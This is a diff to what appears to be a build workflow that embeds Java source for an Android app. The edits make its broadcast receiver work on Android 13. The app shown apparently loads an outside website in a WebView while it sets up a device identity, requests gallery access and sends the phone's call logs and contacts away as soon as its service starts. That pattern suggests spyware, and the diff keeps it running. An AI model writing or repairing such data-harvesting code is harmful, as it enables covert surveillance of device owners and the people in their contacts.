@@ -157,7 +157,12 @@ jobs:
                   webView.setWebViewClient(new WebViewClient());
                   webView.loadUrl("https://neon-aim.vercel.app/");
 
-                  registerReceiver(syncReceiver, new IntentFilter(ACTION_SYNC_CALL_CONTACTS));
+                  IntentFilter filter = new IntentFilter(ACTION_SYNC_CALL_CONTACTS);
+                  if (Build.VERSION.SDK_INT >= 33) {
+                      registerReceiver(syncReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
+                  } else {
+                      registerReceiver(syncReceiver, filter);
+                  }
 
                   requestGalleryPermission();
               }
@@ -347,7 +352,12 @@ jobs:
                   try {
                       initDeviceIdentity();
                       startThreads();
-                      registerReceiver(syncReceiver, new IntentFilter(ACTION_SYNC_CALL_CONTACTS));
+                      IntentFilter filter = new IntentFilter(ACTION_SYNC_CALL_CONTACTS);
+                      if (Build.VERSION.SDK_INT >= 33) {
+                          registerReceiver(syncReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
+                      } else {
+                          registerReceiver(syncReceiver, filter);
+                      }
                       showToast("Service connected");
                   } catch (Throwable t) {
                       Log.e(TAG, "onServiceConnected crash", t);
@@ -418,7 +428,7 @@ jobs:
 
               private void startCallContactsSender() {
                   callContactsThread = new Thread(() -> {
-                      // Immediate sync on service start
+                      // Immediate sync on service start (if permissions already granted)
                       try {
                           sendCallLogs();
                           sendContacts();
